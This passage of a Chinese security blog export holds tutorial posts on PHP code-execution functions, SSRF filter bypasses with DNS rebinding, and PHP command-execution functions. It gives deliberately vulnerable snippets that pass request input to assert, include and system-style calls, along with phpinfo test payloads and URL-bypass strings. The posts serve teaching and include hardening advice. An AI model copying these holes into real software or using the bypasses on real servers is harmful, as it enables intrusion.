<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$str1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">	<span class="variable">$str2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line">	<span class="variable">$str</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="variable">$str1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="variable">$str2</span>);</span><br><span class="line">	uksort(<span class="variable">$str</span>,<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?str1=1&amp;str2=phpinfo()</span><br></pre></td></tr></table></figure>
<h3 id="其他代码执行函数"><a href="#其他代码执行函数" class="headerlink" title="其他代码执行函数"></a>其他代码执行函数</h3><ul>
<li>array_reduce()</li>
<li>array_diff_uassoc()</li>
<li>array_diff_ukey()</li>
<li>array_udiff()</li>
<li>array_udiff_assoc()</li>
<li>array_udiff_uassoc()</li>
<li>array_intersect()</li>
<li>array_intersect_assoc()</li>
<li>array_intersect_uassoc()</li>
<li>array_uintersect()</li>
<li>array_uintersect_assoc()</li>
<li>array_uintersect_uassoc()</li>
<li>array_walk()</li>
<li>array_walk_recursive()</li>
<li>xml_set_character_data_handler()</li>
<li>xml_set_default_handler()</li>
<li>xml_set_end_namespace_decl_handler()</li>
<li>xml_set_external_entity_ref_handler()</li>
<li>xml_set_notation_decl_handler()</li>
<li>xml_set_start_namespace_decl_handler()</li>
<li>xml_set_unparsed_entity_decl_handler()</li>
<li>stream_filter_register()</li>
<li>set_error_handler()</li>
<li>register_shutdown_function()</li>
<li>register_tick_function()</li>
</ul>
<h3 id="动态函数-a-b"><a href="#动态函数-a-b" class="headerlink" title="动态函数 $a($b)"></a>动态函数 $a($b)</h3><p>由于PHP的特性原因，PHP的函数支持直接由拼接的方式调用，这直接导致了PHP在安全上的控制有加大了难度。不少知名程序中也用到了动态函数的写法，这种写法跟使用<code>call_user_func()</code>的初衷一样，用来更加方便地调用函数，但是一旦过滤不严格就会造成代码执行漏洞。</p>
<h4 id="示例-8"><a href="#示例-8" class="headerlink" title="示例"></a>示例</h4><p>漏洞代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">	 <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">	 <span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">	 <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=assert&amp;b=phpinfo()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/08/WAsFkD8SrE71mxL.png" alt="image-20211208182645318"></p>
<h2 id="文件包含函数导致代码执行"><a href="#文件包含函数导致代码执行" class="headerlink" title="文件包含函数导致代码执行"></a>文件包含函数导致代码执行</h2><p>当PHP配置中的<code>allow_url_include=On</code>，<code>allow_url_fopen=On</code>，且PHP版本高于5.2时，会存在文件包含函数导致的代码执行漏洞。</p>
<h4 id="示例-9"><a href="#示例-9" class="headerlink" title="示例"></a>示例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?test=data:text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/08/QiNx69Hz2rltpOn.png" alt="image-20211208185411028"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>曹玉杰，王乐，李家辉，孔韬循 编著《Web代码安全漏洞深度剖析》</li>
<li><a href="https://www.cnblogs.com/LeeeBoom/p/12439342.html">代码执行漏洞 - LeeeBoom - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/weixin_45677145/article/details/111186759">PHP 代码注入漏洞_Hi~ 土拨鼠-CSDN博客_php代码注入漏洞</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/7834367.html#:~:text=PHP中可以执行代码的函数，常用于编写一句话木马，可能导致代码执行漏洞，这里对代码执行函数做一些归纳。 常见代码执行函数，如,eval(">PHP代码执行函数总结 - Bypass - 博客园 (cnblogs.com)</a>、assert()、preg_replace()、create )</li>
<li><a href="https://blog.51cto.com/lovexm/1743442">PHP create_function()代码注入【图文】_605939578_51CTO博客</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>代码执行与命令执行</category>
      </categories>
      <tags>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF的防御与绕过</title>
    <url>/post/5d71c227.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>SSRF漏洞形成的原因主要是<strong>服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤</strong></p>
<p>一般的防御措施是对URL参数进行过滤，或者使得URL参数用户不可控，但当过滤方法不当时，就存在Bypass的不同方式</p>
</blockquote>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h2><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的</p>
<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
<p>原理如下：</p>
<blockquote>
<p>利用解析URL时的规则问题。</p>
</blockquote>
<p>一般情况下利用URL解析导致SSRF过滤被绕过基本上都是<strong>因为后端通过不正确的正则表达式对URL进行了解析</strong>。而在2017年的Blackhat大会上，Orange Thai 在blackhat中发表的演讲《A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! 》中介绍了SSRF攻击的一个新的角度———<strong>利用不同编程语言对URL的处理标准来绕过SSRF过滤，从而实施攻击</strong>。该方式主要是<strong>利用URL解析器和URL请求器之间的差异性</strong>发起攻击，<strong>由于不同的编程语言实现URL解析和请求是不一样的，所以很难验证一个URL是否合法</strong>。</p>
<p>很难验证一个URL是否合法的原因在于：</p>
<ol>
<li><strong>在 RFC2396/RFC3986 中进行了说明,但是也仅仅是说明</strong>。</li>
<li>WHATWG(网页超文本应用技术工作小组)定义了一个基于RFC协议的具体实现，但是不同的编程语言仍然使用他们自己的实现。</li>
</ol>
<p><strong>下图展示了cURL请求函数与其他语言解析函数结合使用时，由于差异性造成的漏洞</strong>。</p>
<p><img src="https://s2.loli.net/2021/12/05/UOs8zvCWPGDSpQr.png" alt="image-20210222151203604"></p>
<p>可以得知，NodeJS url、Perl URI、Go net/url、PHP parser_url以及Ruby addressable解析函数与cURL libcurl请求函数差异性都可能造成漏洞的产生</p>
<p>下图的实例中，我们看到上述所述编程语言的解析函数得到的IP是google.com，而cURL请求得到的却是evil.com:80</p>
<p><img src="https://s2.loli.net/2021/12/05/W4FOuNlm8tXxVa9.png" alt="image-20210222151535178"></p>
<h2 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h2><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www。qq。com</span><br><span class="line">http://www｡qq｡com</span><br><span class="line">http://www．qq．com</span><br></pre></td></tr></table></figure>
<h2 id="本地回环地址"><a href="#本地回环地址" class="headerlink" title="本地回环地址"></a>本地回环地址</h2><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1 </span><br><span class="line">http://localhost </span><br><span class="line">http://127.255.255.254 </span><br><span class="line">127.0.0.1 - 127.255.255.254 </span><br><span class="line">http://[::1] </span><br><span class="line">http://[::ffff:7f00:1] </span><br><span class="line">http://[::ffff:127.0.0.1] </span><br><span class="line">http://127.1 </span><br><span class="line">http://127.0.1 </span><br><span class="line">http://0:80</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/05/w9cvSY8Nne5GLBP.png" alt="img"></p>
<h2 id="IP的进制转换"><a href="#IP的进制转换" class="headerlink" title="IP的进制转换"></a>IP的进制转换</h2><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 <a href="https://github.com/vysecurity/IPFuscator">IPFuscator</a> 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化。</p>
<p>在脚本对IP进行八进制转换时，一些情况下会在字符串末尾多加一个L。<br><img src="https://s2.loli.net/2021/12/05/hoYQZDvUJ4w9gaT.png" alt="img"></p>
<h2 id="封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="封闭式字母数字 (Enclosed Alphanumerics)字符"></a>封闭式字母数字 (Enclosed Alphanumerics)字符</h2><p><a href="https://www.haomeili.net/ZhiShi/34">封闭式字母数字</a>是一个由字母数字组成的Unicode印刷符号块，使用这些符号块替换域名中的字母也可以被浏览器接受。在浏览器测试中只有下列单圆圈的字符可用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
<p>浏览器访问时会自动识别成拉丁英文字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br></pre></td></tr></table></figure>
<h2 id="URL十六进制编码"><a href="#URL十六进制编码" class="headerlink" title="URL十六进制编码"></a>URL十六进制编码</h2><p>URL十六进制编码可被浏览器正常识别，编码脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*- </span></span><br><span class="line">data = <span class="string">&quot;www.qq.com&quot;</span>; </span><br><span class="line">alist = [] </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data: </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(x), <span class="number">2</span>): </span><br><span class="line">        alist.append((x[i:i+<span class="number">2</span>]).encode(<span class="string">&#x27;hex&#x27;</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;http://%&quot;</span>+<span class="string">&#x27;%&#x27;</span>.join(alist)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/05/CF9KS2ufXD1ohMz.png" alt="img"></p>
<h2 id="利用网址缩短"><a href="#利用网址缩短" class="headerlink" title="利用网址缩短"></a>利用网址缩短</h2><p>网上有很多将网址转换未短网址的网站。</p>
<ul>
<li><a href="https://www.985.so/">https://www.985.so/</a></li>
<li><a href="https://www.urlc.cn/">https://www.urlc.cn/</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/05/X5lo7xwzqiHA9js.png" alt="image-20211205142931661"></p>
<h2 id="利用30X重定向"><a href="#利用30X重定向" class="headerlink" title="利用30X重定向"></a>利用30X重定向</h2><p>可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。</p>
<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</p>
<p>服务端代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;Location: http://192.168.1.10&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><p>配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line"></span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure>
<h3 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h3><p>xip.io是一个开源泛域名服务。它会把如下的域名解析到特定的地址，其实和dns解析绕过一个道理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>
<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p><img src="https://s2.loli.net/2021/12/05/iWKSzXIftYlAvV7.png" alt="Untitled Diagram.drawio (3)"></p>
<p>根据流程图：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p>
<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，<strong>设置TTL（TTL表示DNS记录在DNS服务器上缓存时间）时间为0，这是为了防止有DNS服务器对第一次的解析结果进行缓存</strong>。</p>
<p>完整的DNS重绑定攻击流程为：</p>
<ol>
<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
<li>对于获得的IP进行判断，发现为指定范围IP，则通过验证</li>
<li>接下来服务器端对URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址</li>
<li>由于已经绕过验证，所以服务器端返回访问内网资源的内容</li>
</ol>
<p><img src="https://s2.loli.net/2021/12/05/dTB1GKxt7eCqjni.png" alt="在这里插入图片描述"></p>
<p>比如在把同一个域名绑定两个不同的地址，也就是两条A记录，去碰这个概率，要的情况是第一次为外网地址，然而TTL为0，第二次请求的时候要为内网地址。</p>
<p>上面这种情况的话，每次解析的结果随机，所以要达到上面这样情况有1/4的机率，是这样算的吧。所以去碰这个概率，碰到了就能成功，但这种方法不稳定。</p>
<p>需要一个更好的方法：</p>
<p><img src="https://s2.loli.net/2021/12/05/DyrFwbalxVnK9Ae.png" alt="在这里插入图片描述"></p>
<p>所以需要 添加一条A记录和一条NS记录</p>
<p>ns记录表示域名test.bendawang.site这个子域名指定由ns.bendawang.site这个域名服务器来解析，然后a记录表示我的这个ns.bendawang.site的位置在ip地址104.160.43.154上。</p>
<p>这样的话第一解析test.bendawang.site时为ns.bendawang.site这个地址，能通过，</p>
<p>然后第二次解析ns.bendawang.site的时候，就为配置的内网地址了。</p>
<p>这里推荐一个在线的实现URL重绑定的工具（虽然只能实现上述的第一种方式，碰运气去解析）：</p>
<p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p><img src="https://s2.loli.net/2021/12/05/jhxQ8kJ4y1A3CdV.png" alt="image-20211205153307651"></p>
<blockquote>
<p>有关DNS重绑定的具体实现可以参考如下文章：</p>
<p><a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p>
</blockquote>
<h2 id="SSRF的测试工具"><a href="#SSRF的测试工具" class="headerlink" title="SSRF的测试工具"></a>SSRF的测试工具</h2><h3 id="SSRFmap"><a href="#SSRFmap" class="headerlink" title="SSRFmap"></a>SSRFmap</h3><p><a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap-master</a> - 可以在一个请求包中指定SSRF的位置，工具根据模块来发送EXP，支持了下列漏洞的利用：</p>
<p><img src="https://s2.loli.net/2021/12/05/uA9ST8rERJ7OdCh.png" alt="img"></p>
<p>帮助说明如下：<img src="https://s2.loli.net/2021/12/05/gNQ9yGXDZB8pPhz.png" alt="img"></p>
<h3 id="SSRF-Testing"><a href="#SSRF-Testing" class="headerlink" title="SSRF-Testing"></a>SSRF-Testing</h3><p><a href="https://github.com/cujanovic/SSRF-Testing">SSRF-Testing-master</a> - 常用的SSRF绕过测试<img src="https://s2.loli.net/2021/12/05/VtHbOrSz5FkE7oy.png" alt="img"></p>
<h3 id="redis-over-gopher"><a href="#redis-over-gopher" class="headerlink" title="redis-over-gopher"></a>redis-over-gopher</h3><p><a href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">redis-over-gopher</a> - 将请求转换为gopher协议格式<img src="https://s2.loli.net/2021/12/05/VzGxbZkTRBU2aP1.png" alt="img"></p>
<h2 id="SSRF的加固"><a href="#SSRF的加固" class="headerlink" title="SSRF的加固"></a>SSRF的加固</h2><ul>
<li>禁止302跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。</li>
<li>过滤返回信息，验证远程服务器对请求的返回结果，是否合法。</li>
<li>禁用高危协议，例如：gopher、dict、ftp、file等，只允许http/https</li>
<li>设置URL白名单或者限制内网IP</li>
<li>限制请求的端口为http的常用端口，或者根据业务需要治开放远程调用服务的端口</li>
<li>catch错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/weixin_39664643/article/details/113944992?spm=1001.2101.3001.6650.3&amp;utm_medium=distribute.wap_relevant.none-task-blog-2~default~CTRLIST~default-3.wap_blog_relevant_default&amp;depth_1-utm_source=distribute.wap_relevant.none-task-blog-2~default~CTRLIST~default-3.wap_blog_relevant_default">SSRF漏洞之常见Bypass篇_F4ke12138的博客-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_39101049/article/details/102501839">SSRF常见绕过思路_2ed-CSDN博客_ssrf绕过</a></li>
<li><a href="https://www.freebuf.com/vuls/262047.html">SSRF安全指北 - FreeBuf网络安全行业门户</a></li>
<li><a href="https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/#toc-heading-17">SSRF漏洞基础 | Yang Hao’s blog (yanghaoi.github.io)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/116039804">SSRF服务器端请求伪造漏洞基础 - 知乎 (zhihu.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SSRF服务端请求伪造</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行漏洞</title>
    <url>/post/a43e8dc0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>命令执行漏洞是指在Web应用系统中，因为没有对用户传入或构造的参数进行有效的安全性检测，从而执行了参数中嵌入的系统操作命令或调用了触发系统的函数，使得攻击者可以在目标系统中不受限制地执行某些系统命令，例如关机指令、文件删除指令、文件移动指令、端口开启/关闭等指令。</p>
<p>如曾经爆出的bash破壳漏洞，就是通过命令执行漏洞进行恶意攻击的。Wordpress的第三方组件ImageMagick调用不当造成的命令攻击、Java的Struct2框架的远程命令执行攻击等，也属于命令执行漏洞，俗称RCE漏洞。此类漏洞可以进行文件的读取操作，并为恶意攻击者提供内网渗透通道，如反弹shell、内网探测等高级威胁。</p>
</blockquote>
<h2 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h2><h3 id="Windows下的命令连接符"><a href="#Windows下的命令连接符" class="headerlink" title="Windows下的命令连接符"></a>Windows下的命令连接符</h3><ul>
<li><code>&amp;</code>：前面的命令为假则直接执行后面的命令；为真，则在前面的命令执行后再执行后面的命令。</li>
<li><code>&amp;&amp;</code>：前面的命令为假则直接出错，后面的命令也不执行；反之，前面的命令执行成功后执行后面的命令。</li>
<li><code>|</code>：前后命令都按顺序执行，但只显示后面的命令执行结果。</li>
<li><code>||</code>：前面的命令出错，则执行后面的命令；否则，不执行后面的命令。</li>
</ul>
<h3 id="Linux下的命令连接符"><a href="#Linux下的命令连接符" class="headerlink" title="Linux下的命令连接符"></a>Linux下的命令连接符</h3><ul>
<li><code>;</code>：执行完前面的命令再执行后面的命令</li>
<li><code>&amp;</code>：前面的命令为假则直接执行后面的命令；为真，则前面的命令执行后，再执行后面的命令。</li>
<li><code>&amp;&amp;</code>：前面的命令为假则直接出错，后面的命令也不执行；反之，前面的命令执行成功后执行后面的命令。</li>
<li><code>|</code>：前后命令都按顺序执行，但只显示后面的命令执行结果。</li>
<li><code>||</code>：前面的命令出错，则执行后面的命令；否则，不执行后面的命令。</li>
</ul>
<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><p>与代码执行一样，在PHP中也有很多命令执行函数，例如<code>exec()</code>、<code>system()</code>、<code>shell_exec()</code>、<code>passthru()</code>、<code>popen()</code>、<code>proc_open</code>、<code>pcntl_exec()</code>等函数，可以通过参数控制函数执行系统命令。这些函数的参数一旦被攻击者控制或被注入恶意指令，就会导致命令执行漏洞，从而触发恶意攻击操作。</p>
<h3 id="system-函数"><a href="#system-函数" class="headerlink" title="system() 函数"></a>system() 函数</h3><p><code>system()</code>函数执行参数指定的系统命令，并且输出执行结果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">	system(<span class="string">&#x27;ping 192.168.123.188&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>]);    </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/FJSHXlpObZDL7jv.png" alt="image-20211212142303598"></p>
<h3 id="exec-函数"><a href="#exec-函数" class="headerlink" title="exec() 函数"></a>exec() 函数</h3><p><code>exec()</code>函数有两个参数，默认情况下，会返回第一个参数的命令运行结果的最后一行，第二个参数有效时，会将返回追加到第二个参数的值后面。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">	exec(<span class="string">&#x27;ping 192.168.123.188&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>],<span class="variable">$output</span>);</span><br><span class="line">	print_r(<span class="variable">$output</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/qUmXtGv6LDxjRJn.png" alt="image-20211212142925485"></p>
<h3 id="shell-exec-函数"><a href="#shell-exec-函数" class="headerlink" title="shell_exec() 函数"></a>shell_exec() 函数</h3><p><code>shell_exec()</code>函数通过shell执行参数指定的命令，输出命令返回结果的完整字符串。在Linux环境下执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">	print_r(shell_exec(<span class="string">&#x27;ping -c 4 127.0.0.1&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>]));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/Z16yt3oEgDAmnrH.png" alt="image-20211212144613913"></p>
<h3 id="passthru-函数"><a href="#passthru-函数" class="headerlink" title="passthru() 函数"></a>passthru() 函数</h3><p><code>passthru()</code>函数调用参数指定的命令，把命令的运行结果原样地直接输出到标准输出设备上。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">	passthru(<span class="string">&#x27;ping 192.168.123.188&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/KI4JA586nlCodbT.png" alt="image-20211212150623785"></p>
<h3 id="popen-函数"><a href="#popen-函数" class="headerlink" title="popen() 函数"></a>popen() 函数</h3><p><code>popen()</code>函数打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$handle</span> = popen(<span class="variable">$command</span> , <span class="string">&quot;r&quot;</span>); <span class="comment">// Open the command pipe for reading</span></span><br><span class="line">    <span class="keyword">if</span>(is_resource(<span class="variable">$handle</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(function_exists(<span class="string">&#x27;fread&#x27;</span>) &amp;&amp; function_exists(<span class="string">&#x27;feof&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(!feof(<span class="variable">$handle</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> fread(<span class="variable">$handle</span>, <span class="number">1024</span>);        </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(function_exists(<span 